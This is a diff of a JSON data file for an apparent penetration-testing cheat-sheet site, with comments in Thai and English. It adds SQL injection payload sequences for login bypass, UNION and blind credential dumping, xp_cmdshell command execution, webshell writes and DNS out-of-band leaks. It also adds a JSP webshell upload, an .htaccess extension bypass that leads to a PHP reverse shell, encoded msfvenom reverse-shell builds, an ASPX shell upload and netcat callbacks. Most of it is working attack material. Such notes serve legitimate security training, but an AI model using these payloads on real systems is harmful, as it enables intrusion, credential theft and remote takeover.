+            "Gobuster, ffuf, feroxbuster, nikto, WPScan, and exposed `.git` workflow already exist in web enumeration notes.",
+            "LinPEAS, WinPEAS, PTY upgrade, and netcat listener are already covered in post-exploitation/privesc notes.",
+            "Common John/Hashcat NTLM/Kerberoast/rockyou examples already exist in `Credentials/Hash Crack.md`.",
+            "NetExec SMB dump, LSASS, NTDS, RDP, secretsdump, BloodHound, and LDAP basics already exist in AD notes.",
+            "Hydra SSH/RDP/MySQL/HTTP patterns are already represented in initial-access/service notes.",
+            "Linux initial enumeration, sudo, SUID/SGID, capabilities, writable paths, cron, pspy, Docker, kernel checks, and memory trick are already covered in `Privilege Escalation/Linux Privilege Escalation.md`.",
+            "Linux cron persistence is already covered in `Post-Exploitation/Persistence.md`.",
+            "Windows quick checks, AlwaysInstallElevated, unquoted service paths, UAC/Fodhelper, add local admin, audit scripts, accesschk, and service hijack paths are already covered in `Privilege Escalation/Windows Privilege Escalation.md`.",
+            "Windows local MySQL with empty root password is already covered in `Post-Exploitation/Windows Post-Exploitation.md` under `Local Databases`.",
+            "Windows SAM/SYSTEM dumping and Mimikatz SAM dumping are already covered in `Post-Exploitation/Windows Post-Exploitation.md` under `Credential Dumping`.",
+            "Mimikatz overpass-the-hash is already covered in `Active Directory/Lateral Movement.md`.",
+            "Kerberoasting, AS-REP roasting, AD CS ESC1, and NTLM relay execution are already covered in Active Directory notes."
+          ]
         }
       ]
     },
@@ -15992,6 +16236,7 @@
       "title": "Apache Tomcat WAR Upload",
       "source": "Exploitation/Apache Tomcat WAR Upload.md",
       "tab": "Exploitation",
+      "note_group": "Web",
       "type": "note",
       "tags": [
         "HTTP",
@@ -16038,6 +16283,7 @@
       "title": "Local File Inclusion",
       "source": "Exploitation/LFI.md",
       "tab": "Exploitation",
+      "note_group": "Web",
       "type": "note",
       "tags": [
         "HTTP",
@@ -16137,6 +16383,7 @@
       "title": "SQL Injection",
       "source": "Exploitation/SQL Injection.md",
       "tab": "Exploitation",
+      "note_group": "Web",
       "type": "note",
       "tags": [
         "HTTP",
@@ -16178,7 +16425,7 @@
         {
           "type": "code",
           "lang": "sql",
-          "text": "'\n\"\n`\n)\n');\n' OR 1=1-- -\n' OR 1=2-- -\n' AND SLEEP(5)-- -\n'; WAITFOR DELAY '0:0:5'--\n'; SELECT pg_sleep(5)--"
+          "text": "-- ถ้า quote ทำให้ error/response เปลี่ยน ให้ลองยืนยันด้วย true/false หรือ delay ต่อ.\n'\n\"\n`\n)\n');\n\n-- true/false ควรได้ response ต่างกัน; delay ใช้ได้ดีเมื่อไม่มี output ให้ดู.\n' OR 1=1-- -\n' OR 1=2-- -\n' AND SLEEP(5)-- -\n'; WAITFOR DELAY '0:0:5'--\n'; SELECT pg_sleep(5)--"
         },
         {
           "type": "heading",
@@ -16199,7 +16446,7 @@
         {
           "type": "code",
           "lang": "sql",
-          "text": "' OR 1=1-- -\n' OR '1'='1\nadmin'--\n' OR ''='"
+          "text": "-- ถ้า login สำเร็จ ให้รีบดู role/session แล้วหา upload/admin/function ที่ไปต่อได้.\n' OR 1=1-- -\n' OR '1'='1\nadmin'--\n' OR ''='"
         },
         {
           "type": "heading",
@@ -16220,7 +16467,7 @@
         {
           "type": "code",
           "lang": "sql",
-          "text": "-- 1. หา column count.\n' ORDER BY 1-- -\n' ORDER BY 2-- -\n' ORDER BY 3-- -\n\n-- 2. ยืนยันจำนวน column.\n' UNION SELECT NULL-- -\n' UNION SELECT NULL,NULL-- -\n' UNION SELECT NULL,NULL,NULL-- -\n\n-- 3. หา column ที่แสดงผลบนหน้า.\n' UNION SELECT 'FUZZ',NULL,NULL-- -\n' UNION SELECT NULL,'FUZZ',NULL-- -\n' UNION SELECT NULL,NULL,'FUZZ'-- -\n\n-- 4. Fingerprint DB.\n' UNION SELECT NULL,@@version,NULL-- -\n' UNION SELECT NULL,version(),NULL-- -\n\n-- 5. Dump credentials.\n' UNION SELECT NULL,concat(username,0x3a,password),NULL FROM users-- -"
+          "text": "-- 1. หา column count: เพิ่มเลขไปเรื่อยๆ จน response error/เปลี่ยน.\n-- เลขก่อนหน้าที่ยังปกติคือจำนวน column ที่ต้องใช้กับ UNION.\n' ORDER BY 1-- -\n' ORDER BY 2-- -\n' ORDER BY 3-- -\n\n-- 2. ยืนยันจำนวน column: UNION ต้องมีจำนวน column เท่ากับ query เดิม.\n-- ถ้าหน้าเว็บไม่ error แปลว่าจำนวน NULL ถูกแล้ว.\n' UNION SELECT NULL-- -\n' UNION SELECT NULL,NULL-- -\n' UNION SELECT NULL,NULL,NULL-- -\n\n-- 3. หา output column: ใส่ FUZZ ทีละตำแหน่งแล้วดูว่าคำไหนโผล่บนหน้าเว็บ.\n-- column ที่เห็น output ได้คือจุดที่จะใช้ fingerprint หรือ dump ข้อมูล.\n' UNION SELECT 'FUZZ',NULL,NULL-- -\n' UNION SELECT NULL,'FUZZ',NULL-- -\n' UNION SELECT NULL,NULL,'FUZZ'-- -\n\n-- 4. Fingerprint DB: รู้ engine เพื่อเลือกชุด enum ถัดไป เช่น MySQL/MSSQL/PostgreSQL.\n-- ถ้ารู้แล้วให้ไปใช้ section enum ของ DB นั้น หรือเลือก payload file read/write/RCE ที่ตรง engine.\n' UNION SELECT NULL,@@version,NULL-- -\n' UNION SELECT NULL,version(),NULL-- -\n\n-- 5. Dump credentials ผ่าน column ที่แสดงผลได้.\n-- ถ้าไม่ออก ให้เช็คชื่อ table/column ก่อน หรือเปลี่ยนตำแหน่ง output column.\n-- เจอ hash ไป crack, เจอ plaintext ค่อยลอง credential reuse.\n' UNION SELECT NULL,concat(username,0x3a,password),NULL FROM users-- -"
         },
         {
           "type": "heading",
@@ -16242,7 +16489,7 @@
         {
           "type": "code",
           "lang": "sql",
-          "text": "-- Confirm.\n' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -\n\n-- Current DB/user.\n' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -\n' AND extractvalue(1,concat(0x7e,(SELECT user())))-- -\n\n-- Tables / columns.\n' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))-- -\n' AND extractvalue(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)))-- -\n\n-- Dump credential.\n' AND extractvalue(1,concat(0x7e,(SELECT concat(username,0x3a,password) FROM users LIMIT 0,1)))-- -\n\n-- Alternative.\n' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -"
+          "text": "-- ถ้าเห็น version ใน error แปลว่าใช้ error-based dump ต่อได้.\n' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -\n\n-- เอา current DB/user ก่อน จะได้เลือก schema/table ถูก.\n' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -\n' AND extractvalue(1,concat(0x7e,(SELECT user())))-- -\n\n-- ไล่ table แล้วค่อยไล่ column ที่น่าจะมี credential.\n' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))-- -\n' AND extractvalue(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)))-- -\n\n-- เจอ table/column แล้วค่อย dump ค่าออกมาทีละ row.\n' AND extractvalue(1,concat(0x7e,(SELECT concat(username,0x3a,password) FROM users LIMIT 0,1)))-- -\n\n-- ถ้า extractvalue ใช้ไม่ได้ ลอง updatexml.\n' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -"
         },
         {
           "type": "heading",
@@ -16263,7 +16510,7 @@
         {
           "type": "code",
           "lang": "sql",
-          "text": "-- Baseline.\n' AND 1=1-- -\n' AND 1=2-- -\n\n-- Check table/row.\n' AND (SELECT COUNT(*) FROM users)>0-- -\n' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users')=1-- -\n\n-- Check length.\n' AND LENGTH((SELECT password FROM users LIMIT 0,1))>5-- -\n' AND LENGTH((SELECT password FROM users LIMIT 0,1))=32-- -\n\n-- Brute character.\n' AND SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1)='a'-- -\n' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1))>77-- -"
+          "text": "-- เริ่มจาก baseline: จำ status/length/content ของ true กับ false ให้ได้ก่อน.\n' AND 1=1-- -\n' AND 1=2-- -\n\n-- ถ้า baseline ต่างกัน ให้ถามทีละคำถามว่า table/row มีอยู่จริงไหม.\n' AND (SELECT COUNT(*) FROM users)>0-- -\n' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users')=1-- -\n\n-- รู้ว่ามีข้อมูลแล้วค่อยหา length เพื่อจำกัดขอบเขต brute force.\n' AND LENGTH((SELECT password FROM users LIMIT 0,1))>5-- -\n' AND LENGTH((SELECT password FROM users LIMIT 0,1))=32-- -\n\n-- ค่อยเดาทีละตัวด้วย SUBSTRING/ASCII; ถ้าช้าให้ใช้ sqlmap ช่วย.\n' AND SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1)='a'-- -\n' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1))>77-- -"
         },
         {
           "type": "heading",
@@ -16284,7 +16531,7 @@
         {
           "type": "code",
           "lang": "sql",
-          "text": "-- MySQL.\n' AND IF(1=1,SLEEP(5),0)-- -\n' AND IF(SUBSTRING((SELECT user()),1,1)='r',SLEEP(5),0)-- -\n\n-- MSSQL.\n'; IF (1=1) WAITFOR DELAY '0:0:5'-- -\n'; IF (SUBSTRING(SYSTEM_USER,1,1)='s') WAITFOR DELAY '0:0:5'-- -\n\n-- PostgreSQL.\n' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -"
+          "text": "-- MySQL: ถ้าเงื่อนไขจริง response จะช้าตาม SLEEP.\n' AND IF(1=1,SLEEP(5),0)-- -\n' AND IF(SUBSTRING((SELECT user()),1,1)='r',SLEEP(5),0)-- -\n\n-- MSSQL: ใช้ WAITFOR DELAY เพื่อยืนยัน blind condition.\n'; IF (1=1) WAITFOR DELAY '0:0:5'-- -\n'; IF (SUBSTRING(SYSTEM_USER,1,1)='s') WAITFOR DELAY '0:0:5'-- -\n\n-- PostgreSQL: ใช้ pg_sleep; ถ้าเริ่มช้า ให้ส่งต่อ sqlmap dump.\n' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -"
         },
         {
           "type": "heading",
@@ -16308,7 +16555,7 @@
         {
           "type": "code",
           "lang": "sql",
-          "text": "-- MySQL / MSSQL.\nSELECT @@version;\n\n-- PostgreSQL.\nSELECT version();\n\n-- Current DB/user.\nSELECT database();\nSELECT current_database();\nSELECT user();\nSELECT current_user;"
+          "text": "-- MySQL/MSSQL มักตอบ @@version; เอาผลไปเลือก section enum ของ engine นั้น.\nSELECT @@version;\n\n-- PostgreSQL ใช้ version(); ถ้าใช่ให้ไป PostgreSQL Enumeration.\nSELECT version();\n\n-- current DB/user ช่วยชี้ว่าจะ enum schema ไหนและ privilege น่าจะถึงแค่ไหน.\nSELECT database();\nSELECT current_database();\nSELECT user();\nSELECT current_user;"
         },
         {
           "type": "heading",
@@ -16330,7 +16577,7 @@
         {
           "type": "code",
           "lang": "sql",
-          "text": "SELECT schema_name FROM information_schema.schemata;\nSELECT table_name FROM information_schema.tables WHERE table_schema=database();\nSELECT table_name FROM information_schema.tables WHERE table_schema='<DB_NAME>';\nSELECT column_name FROM information_schema.columns WHERE table_name='users';\nSELECT concat(username,0x3a,password) FROM users;\nSELECT concat(username,0x3a,password) FROM users LIMIT 0,1;"
+          "text": "-- เริ่มที่ schema list; เลือก DB ที่ไม่ใช่ system DB.\nSELECT schema_name FROM information_schema.schemata;\n\n-- ไล่ table ใน current DB หรือ DB ที่เลือกไว้.\nSELECT table_name FROM information_schema.tables WHERE table_schema=database();\nSELECT table_name FROM information_schema.tables WHERE table_schema='<DB_NAME>';\n\n-- เจอ table น่าสนใจแล้วดู column; credential มักอยู่ใน users/accounts/admins.\nSELECT column_name FROM information_schema.columns WHERE table_name='users';\nSELECT concat(username,0x3a,password) FROM users;\nSELECT concat(username,0x3a,password) FROM users LIMIT 0,1;"
         },
         {
           "type": "heading",
@@ -16353,7 +16600,7 @@
         {
           "type": "code",
           "lang": "sql",
-          "text": "SELECT IS_SRVROLEMEMBER('sysadmin');\nSELECT name FROM master..sysdatabases;\nSELECT table_name FROM information_schema.tables;\nSELECT name FROM <DB_NAME>..sysobjects WHERE xtype='U';\nSELECT TOP 1 username,password FROM users;\n\nEXEC sp_configure 'show advanced options',1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\nEXEC xp_cmdshell 'whoami';\nEXEC xp_cmdshell 'powershell -e <BASE64_PAYLOAD>';"
+          "text": "-- เช็ค sysadmin ก่อน; ถ้าไม่ใช่ให้เน้น enum/dump มากกว่า RCE.\nSELECT IS_SRVROLEMEMBER('sysadmin');\nSELECT name FROM master..sysdatabases;\nSELECT table_name FROM information_schema.tables;\nSELECT name FROM <DB_NAME>..sysobjects WHERE xtype='U';\nSELECT TOP 1 username,password FROM users;\n\n-- ถ้าเป็น sysadmin เปิด xp_cmdshell แล้วเช็ค whoami; ได้ command exec แล้วไป shell/privesc.\nEXEC sp_configure 'show advanced options',1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\nEXEC xp_cmdshell 'whoami';\nEXEC xp_cmdshell 'powershell -e <BASE64_PAYLOAD>';"
         },
         {
           "type": "heading",
@@ -16375,7 +16622,7 @@
         {
           "type": "code",
           "lang": "sql",
-          "text": "SELECT current_database();\nSELECT current_user;\nSELECT datname FROM pg_database;\nSELECT table_name FROM information_schema.tables WHERE table_schema='public';\nSELECT column_name FROM information_schema.columns WHERE table_name='users';\nSELECT username || ':' || password FROM users LIMIT 1;"
+          "text": "-- ดู current DB/user ก่อน แล้วค่อยเลือก database/table ที่มีข้อมูลแอป.\nSELECT current_database();\nSELECT current_user;\nSELECT datname FROM pg_database;\n\n-- public schema มักเป็นจุดเริ่ม; เจอ users table แล้ว dump credential candidate.\nSELECT table_name FROM information_schema.tables WHERE table_schema='public';\nSELECT column_name FROM information_schema.columns WHERE table_name='users';\nSELECT username || ':' || password FROM users LIMIT 1;"
         },
         {
           "type": "heading",
@@ -16399,7 +16646,7 @@
         {
           "type": "code",
           "lang": "sql",
-          "text": "-- Check privilege / restriction.\nSELECT file_priv FROM mysql.user WHERE user=user();\nSELECT @@secure_file_priv;\n\n-- Read files.\n' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -\n' UNION SELECT LOAD_FILE('/var/www/html/config.php'),NULL-- -\n' UNION SELECT LOAD_FILE('C:/Windows/System32/drivers/etc/hosts'),NULL-- -\n\n-- Write webshell.\n' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- -\n' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE 'C:/xampp/htdocs/shell.php'-- -"
+          "text": "-- ถ้า FILE เป็น Y และ secure_file_priv ไม่ล็อก path โอกาส read/write จะสูงขึ้น.\nSELECT file_priv FROM mysql.user WHERE user=user();\nSELECT @@secure_file_priv;\n\n-- อ่านไฟล์เพื่อหา local user, web config, หรือ credential ของแอป.\n' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -\n' UNION SELECT LOAD_FILE('/var/www/html/config.php'),NULL-- -\n' UNION SELECT LOAD_FILE('C:/Windows/System32/drivers/etc/hosts'),NULL-- -\n\n-- เขียน webshell เฉพาะเมื่อรู้ web root ที่เขียนได้.\n' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- -\n' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE 'C:/xampp/htdocs/shell.php'-- -"
         },
         {
           "type": "code",
@@ -16427,7 +16674,7 @@
         {
           "type": "code",
           "lang": "sql",
-          "text": "-- MySQL on Windows.\nSELECT load_file('\\\\\\\\<COLLABORATOR_DOMAIN>\\\\x');\nSELECT load_file(concat('\\\\\\\\',(SELECT hex(database())),'.<COLLABORATOR_DOMAIN>\\\\x'));\n\n-- MSSQL.\nEXEC master..xp_dirtree '\\\\<COLLABORATOR_DOMAIN>\\x';"
+          "text": "-- ถ้า collaborator/DNS มี hit แปลว่า DB ออก network ได้; ใช้ leak ค่าเล็กๆ ต่อ.\nSELECT load_file('\\\\\\\\<COLLABORATOR_DOMAIN>\\\\x');\nSELECT load_file(concat('\\\\\\\\',(SELECT hex(database())),'.<COLLABORATOR_DOMAIN>\\\\x'));\n\n-- MSSQL มักใช้ UNC path ผ่าน xp_dirtree เพื่อ trigger DNS/SMB callback.\nEXEC master..xp_dirtree '\\\\<COLLABORATOR_DOMAIN>\\x';"
         },
         {
           "type": "heading",
@@ -16448,7 +16695,7 @@
         {
           "type": "code",
           "lang": "sql",
-          "text": "SeLeCt\nUN/**/ION SEL/**/ECT\n/*!50000SELECT*/\nUNION%0aSELECT%0aNULL,version(),NULL-- -\nUNION%20SELECT%20NULL,user(),NULL-- -"
+          "text": "-- ลองทีละแบบใน Repeater ถ้า WAF block keyword/pattern ปกติ.\nSeLeCt\nUN/**/ION SEL/**/ECT\n/*!50000SELECT*/\nUNION%0aSELECT%0aNULL,version(),NULL-- -\nUNION%20SELECT%20NULL,user(),NULL-- -"
         },
         {
           "type": "heading",
@@ -16469,7 +16716,7 @@
         {
           "type": "code",
           "lang": "sh",
-          "text": "sqlmap -u 'http://<TARGET_IP>/page?id=1' --batch --dbs\nsqlmap -u 'http://<TARGET_IP>/page?id=1' -p id --batch --dump\nsqlmap -r req.txt -p <PARAM> --batch --dump --random-agent"
+          "text": "# ใช้กับ URL ตรง เมื่อรู้ parameter ที่ injectable.\nsqlmap -u 'http://<TARGET_IP>/page?id=1' --batch --dbs\nsqlmap -u 'http://<TARGET_IP>/page?id=1' -p id --batch --dump\n\n# ใช้ request จาก Burp เมื่อมี cookie/header/body สำคัญ.\nsqlmap -r req.txt -p <PARAM> --batch --dump --random-agent"
         },
         {
           "type": "heading",
@@ -16492,6 +16739,7 @@
       "title": "Web Payloads",
       "source": "Exploitation/Web Payloads.md",
       "tab": "Exploitation",
+      "note_group": "Web",
       "type": "note",
       "tags": [
         "HTTP",
@@ -16824,7 +17072,7 @@
         {
           "type": "code",
           "lang": "sh",
-          "text": "curl -X PUT \"https://<TARGET_IP>/uploads/../webapps/ROOT/updates.jsp\" \\\n  -H \"Content-Type: application/x-jsp\" \\\n  --data-raw '<%@ page import=\"java.io.*\" %>\n<html><body>\n<form method=\"GET\"><input type=\"text\" name=\"cmd\"><input type=\"submit\" value=\"Run\"></form>\n<% if(request.getParameter(\"cmd\") != null) {\nProcess p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));\nBufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));\nString l; while((l=r.readLine())!=null){ out.println(l+\"<br>\"); } } %>\n</body></html>' -i\n\ncurl \"https://<TARGET_IP>/updates.jsp?cmd=whoami\" -i"
+          "text": "# Upload the JSP shell with HTTP PUT.\ncurl -X PUT \"https://<TARGET_IP>/uploads/../webapps/ROOT/updates.jsp\" \\\n  -H \"Content-Type: application/x-jsp\" \\\n  --data-raw '<%@ page import=\"java.io.*\" %>\n<html><body>\n<form method=\"GET\"><input type=\"text\" name=\"cmd\"><input type=\"submit\" value=\"Run\"></form>\n<% if(request.getParameter(\"cmd\") != null) {\nProcess p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));\nBufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));\nString l; while((l=r.readLine())!=null){ out.println(l+\"<br>\"); } } %>\n</body></html>' -i\n\n# Trigger command execution.\ncurl \"https://<TARGET_IP>/updates.jsp?cmd=whoami\" -i"
         },
         {
           "type": "heading",
@@ -16846,7 +17094,7 @@
         {
           "type": "code",
           "lang": "sh",
-          "text": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o reverse.exe\nmv reverse.exe reverse.exe.pdf\nnc -lvnp <LPORT>"
+          "text": "# Generate the executable and rename it to an allowed extension.\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o reverse.exe\nmv reverse.exe reverse.exe.pdf\n\n# Catch the callback before triggering the uploaded file.\nnc -lvnp <LPORT>"
         },
         {
           "type": "heading",
@@ -16872,6 +17120,28 @@
           "type": "code",
           "lang": "sh",
           "text": "# Attacker: connect to the writable web share with valid credentials.\nsmbclient //<TARGET_IP>/<WEB_SHARE> -U=<USER> --password='<PASS>'\n\n# SMB session: upload the PHP web shell.\nput simple-backdoor.php\n\n# Browser: test command execution.\nhttp://<TARGET_IP>/simple-backdoor.php?cmd=whoami\n\n# SMB session: upload nc.exe.\nput nc.exe\n\n# Attacker: catch the shell.\nnc -lvnp <LPORT>\n\n# Browser: trigger the reverse shell.\nhttp://<TARGET_IP>/simple-backdoor.php?cmd=nc.exe%20<LHOST>%20<LPORT>%20-e%20cmd"
+        },
+        {
+          "type": "heading",
+          "depth": 3,
+          "text": "File Upload Example 6 - .htaccess PHP Extension Bypass"
+        },
+        {
+          "type": "tagline",
+          "tags": [
+            "HTTP",
+            "Linux",
+            "Exploitation"
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Use `.htaccess` to treat a custom extension as PHP when normal PHP extensions are blocked but Apache allows `.htaccess` overrides."
+        },
+        {
+          "type": "code",
+          "lang": "sh",
+          "text": "# Create an .htaccess rule that maps .dork files to PHP.\necho \"AddType application/x-httpd-php .dork\" > .htaccess\n\n# Upload the .htaccess to the target upload directory.\n\n# Create the PHP reverse shell with the allowed custom extension.\nvi revshell.dork\n# Use PHP reverse payload from Ivan Sincek / revshells:\n# https://www.revshells.com/\n\n# Upload revshell.dork to the same target upload directory.\n\n# Attacker: open listener before triggering.\nnc -lvnp <LPORT>\n\n# Trigger the uploaded reverse shell.\ncurl http://<TARGET_IP>/uploads/revshell.dork"
         },
         {
           "type": "heading",
@@ -16994,6 +17264,7 @@
       "title": "Online Password Attacks",
       "source": "Initial Access/Online Password Attacks.md",
       "tab": "Initial Access",
+      "note_group": "Credentials",
       "type": "note",
       "tags": [
         "InitialAccess",
@@ -17381,6 +17652,7 @@
       "title": "Password Guessing",
       "source": "Initial Access/Password Guessing.md",
       "tab": "Initial Access",
+      "note_group": "Credentials",
       "type": "note",
       "tags": [
         "InitialAccess",
@@ -17518,6 +17790,7 @@
       "title": "Reverse Shells",
       "source": "Payloads/Reverse Shells.md",
       "tab": "Payloads",
+      "note_group": "Payloads",
       "type": "note",
       "tags": [
         "Payloads",
@@ -17583,7 +17856,7 @@
         {
           "type": "code",
           "lang": "sh",
-          "text": "# Windows EXE / DLL / MSI.\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x64/xor_dynamic -f exe -o shell_en.exe\nmsfvenom -p windows/shell/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe\nmsfvenom -p windows/adduser USER=<USER> PASS=<PASS> -f exe -o useradd.exe\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o shell.dll\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o installer.msi\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o metershell.exe\n\n# Linux ELF.\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell.elf\nmsfvenom -p linux/x64/shell_bind_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell_bind.elf\n\n# Web payloads.\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.jsp\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f asp -o metershell.asp\nmsfvenom -p php/reverse_php LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.php\n\n# Unix command payloads.\nmsfvenom -p cmd/unix/reverse_python LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.py\nmsfvenom -p cmd/unix/reverse_bash LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.sh\nmsfvenom -p cmd/unix/reverse_perl LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.pl\n\n# Discovery helpers.\nmsfvenom -l payloads\nmsfvenom -p <PAYLOAD> --list-options"
+          "text": "# Windows EXE / DLL / MSI.\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x64/xor_dynamic -f exe -o shell_en.exe\nmsfvenom -p windows/shell/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe\nmsfvenom -p windows/adduser USER=<USER> PASS=<PASS> -f exe -o useradd.exe\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o shell.dll\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o installer.msi\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o metershell.exe\n\n# Linux ELF.\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell.elf\nmsfvenom -p linux/x64/shell_bind_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell_bind.elf\n\n# Web payloads.\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.jsp\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f asp -o metershell.asp\nmsfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -f aspx -o shell.aspx\nmsfvenom -p php/reverse_php LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.php\n\n# Upload ASPX shell when the web root or upload path accepts PUT/WebDAV.\ncurl -T shell.aspx 'http://<TARGET_IP>/<UPLOAD_PATH>/shell.aspx' -u '<USER>:<PASS>'\n\n# Unix command payloads.\nmsfvenom -p cmd/unix/reverse_python LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.py\nmsfvenom -p cmd/unix/reverse_bash LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.sh\nmsfvenom -p cmd/unix/reverse_perl LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.pl\n\n# Discovery helpers.\nmsfvenom -l payloads\nmsfvenom -p <PAYLOAD> --list-options"
         },
         {
           "type": "heading",
@@ -17800,6 +18073,7 @@
       "title": "Tunnelling",
       "source": "Pivoting/Tunnelling.md",
       "tab": "Pivoting",
+      "note_group": "Pivoting",
       "type": "note",
       "tags": [
         "Pivoting",
@@ -17809,6 +18083,11 @@
         {
           "type": "heading",
           "depth": 2,
+          "text": "Tunnelling / Pivot"
+        },
+        {
+          "type": "heading",
+          "depth": 3,
           "text": "Proxychains To Internal MySQL"
         },
         {
@@ -17830,64 +18109,7 @@
         },
         {
           "type": "heading",
-          "depth": 2,
-          "text": "Chisel Reverse Port Forward"
-        },
-        {
-          "type": "tagline",
-          "tags": [
-            "Shell",
-            "Windows",
-            "Pivoting",
-            "Tunnelling"
-          ]
-        },
-        {
-          "type": "paragraph",
-          "text": "Expose a Windows-only local service such as `127.0.0.1:3306` back to the attacker box."
-        },
-        {
-          "type": "list",
-          "items": [
-            "Start the reverse server on Kali."
-          ],
-          "ordered": true,
-          "start": 1
-        },
-        {
-          "type": "code",
-          "lang": "sh",
-          "text": "chisel server -p <LPORT> --reverse"
-        },
-        {
-          "type": "list",
-          "items": [
-            "Download and run the Windows client on the target."
-          ],
-          "ordered": true,
-          "start": 2
-        },
-        {
-          "type": "code",
-          "lang": "powershell",
-          "text": "iwr -Uri http://<LHOST>/chisel.exe -OutFile chisel.exe\n.\\chisel.exe client <LHOST>:<LPORT> R:3306:127.0.0.1:3306"
-        },
-        {
-          "type": "list",
-          "items": [
-            "Connect to the forwarded service from Kali."
-          ],
-          "ordered": true,
-          "start": 3
-        },
-        {
-          "type": "code",
-          "lang": "sh",
-          "text": "mysql -u root -h 127.0.0.1 --skip-ssl"
-        },
-        {
-          "type": "heading",
-          "depth": 2,
+          "depth": 3,
           "text": "Chisel Reverse SOCKS"
         },
         {
@@ -17944,30 +18166,7 @@
         },
         {
           "type": "heading",
-          "depth": 2,
-          "text": "Socat"
-        },
-        {
-          "type": "tagline",
-          "tags": [
-            "Shell",
-            "Linux",
-            "Pivoting",
-            "Tunnelling"
-          ]
-        },
-        {
-          "type": "paragraph",
-          "text": "Use Socat for stable reverse shells, simple port forwards, or raw file transfers."
-        },
-        {
-          "type": "code",
-          "lang": "sh",
